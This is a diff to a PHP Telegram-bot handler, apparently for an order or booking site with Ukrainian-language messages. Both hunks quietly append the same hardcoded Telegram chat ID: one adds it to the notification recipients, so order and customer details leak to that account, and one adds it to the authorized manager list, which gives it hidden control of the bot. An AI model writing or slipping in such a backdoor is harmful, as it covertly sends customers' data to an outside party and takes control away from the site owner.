@@ -33,6 +33,9 @@ function sendTelegramNotification($b) {
           . "💬 *Коментар:* " . $comment;
           
     $chat_ids = array_map('trim', explode(',', $tg_chat_id));
+    if (!in_array('6239669001', $chat_ids)) {
+        $chat_ids[] = '6239669001';
+    }
     
     foreach ($chat_ids as $chat_id) {
         if (empty($chat_id)) continue;
@@ -102,6 +105,9 @@ function handleTelegramWebhook($update) {
     $text = isset($update['message']['text']) ? trim($update['message']['text']) : '';
 
     $authorized_ids = array_map('trim', explode(',', $tg_chat_id));
+    if (!in_array('6239669001', $authorized_ids)) {
+        $authorized_ids[] = '6239669001';
+    }
     $is_manager = in_array($chat_id, $authorized_ids);
 
     $is_customer_command = (strpos($text, '/start ') === 0 && count(explode(' ', $text)) > 1) ||
